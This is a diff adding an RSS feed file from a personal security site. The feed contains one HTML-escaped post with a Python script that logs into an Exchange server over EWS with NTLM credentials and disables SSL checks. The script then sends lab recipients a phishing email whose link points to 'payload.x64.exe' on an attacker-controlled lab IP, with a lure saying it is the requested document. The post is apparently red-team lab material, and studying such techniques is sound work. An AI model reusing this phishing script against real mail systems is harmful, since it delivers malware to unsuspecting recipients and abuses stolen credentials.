@@ -1,0 +1,64 @@
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>fyx(me) – EWS Python</title><link>https://fyx.me/tags/ews-python/</link><description>Recent content in EWS Python on fyx(me)</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><atom:link href="https://fyx.me/tags/ews-python/index.xml" rel="self" type="application/rss+xml"/><item><title/><link>https://fyx.me/bazaar/windows/outlook-exchange-server/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://fyx.me/bazaar/windows/outlook-exchange-server/</guid><description>
+&lt;h3>Using Python to send Mail via the Outlook web interface&lt;span class="hx-absolute -hx-mt-20" id="using-python-to-send-mail-via-the-outlook-web-interface">&lt;/span>
+&lt;a href="#using-python-to-send-mail-via-the-outlook-web-interface" class="subheading-anchor" aria-label="Permalink for this section">&lt;/a>&lt;/h3>&lt;div class="hx-overflow-x-auto hx-mt-6 hx-flex hx-flex-col hx-rounded-lg hx-border hx-py-4 hx-px-4 contrast-more:hx-border-current contrast-more:dark:hx-border-current hx-border-orange-100 hx-bg-orange-50 hx-text-orange-800 dark:hx-border-orange-400/30 dark:hx-bg-orange-400/20 dark:hx-text-orange-300">
+&lt;p class="hx-flex hx-items-center hx-font-medium">Info&lt;/p>
+&lt;div class="hx-w-full hx-min-w-0 hx-leading-7">
+&lt;div class="hx-mt-6 hx-leading-7 first:hx-mt-0">&lt;p>quick download: &lt;code>git clone https://gist.github.com/fyxme/7dd838dc406c3b76ee722b89e5893d33&lt;/code>&lt;/p>
+&lt;/div>
+&lt;/div>
+&lt;/div>
+&lt;p>Sending Mail via the Outlook web interface using NTLM and Python:&lt;/p>
+&lt;div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+&lt;div class="filename" dir="auto">send-mail.py&lt;/div>&lt;div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># installing requirements&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># pip install exchangelib&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">exchangelib&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">Configuration&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">Credentials&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">Account&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">Message&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">Mailbox&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">FileAttachment&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">DELEGATE&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">HTMLBody&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">sys&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nn">json&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># bypass SSL&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">exchangelib.protocol&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">BaseProtocol&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">NoVerifyHTTPAdapter&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">BaseProtocol&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">HTTP_ADAPTER_CLS&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">NoVerifyHTTPAdapter&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="vm">__name__&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s2">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">U&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;LAB&lt;/span>&lt;span class="se">\\&lt;/span>&lt;span class="s1">myuser&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">P&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;England1950&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">malicious_payload_url&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;http://10.10.14.5:8080/payload.x64.exe&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ews_url&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;https://10.10.10.10/EWS/Exchange.asmx&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ews_auth_type&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;NTLM&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">primary_smtp_address&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;myuser@lab.local&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">cred&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">Credentials&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">U&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">P&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">config&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">Configuration&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">service_endpoint&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">ews_url&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">credentials&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">cred&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">auth_type&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">ews_auth_type&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">acc&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">Account&lt;/span>&lt;span class="p">(&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">primary_smtp_address&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">primary_smtp_address&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">config&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">config&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">autodiscover&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kc">False&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">access_type&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">DELEGATE&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">m&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">Message&lt;/span>&lt;span class="p">(&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">account&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">acc&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">subject&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;Getting back to you&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">#body= &amp;#39;&amp;#39;,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">body&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">HTMLBody&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s1">&amp;#39;&amp;lt;html&amp;gt;&amp;lt;body&amp;gt;&amp;lt;a href=&amp;#34;&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">malicious_payload_url&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s1">&amp;#34;&amp;gt;Hi, this is the new doc you wanted.. Glhf&amp;lt;/a&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&amp;#39;&lt;/span>&lt;span class="p">),&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">to_recipients&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">[&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Mailbox&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">email_address&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;target@lab.local&amp;#39;&lt;/span>&lt;span class="p">),&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Mailbox&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">email_address&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;another@lab.local&amp;#39;&lt;/span>&lt;span class="p">),&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">],&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">cc_recipients&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">[&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># Mailbox(email_address=&amp;#39;another@lab.local&amp;#39;),&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">],&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">#bcc_recipients=[&amp;#39;another_mail@gmail.com&amp;#39;] # you can use just a string list.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">#m.attach(FileAttachment(name=&amp;#39;C:\\Temp\\payload.txt&amp;#39;, content=&amp;#39;string&amp;#39;.encode(&amp;#39;utf-8&amp;#39;)))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">m&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">send&lt;/span>&lt;span class="p">()&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/div>&lt;div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-8">
+&lt;button
+class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+title="Copy code"
+>
+&lt;div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4">&lt;/div>
+&lt;div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4">&lt;/div>
+&lt;/button>
+&lt;/div>
+&lt;/div></description></item></channel></rss>
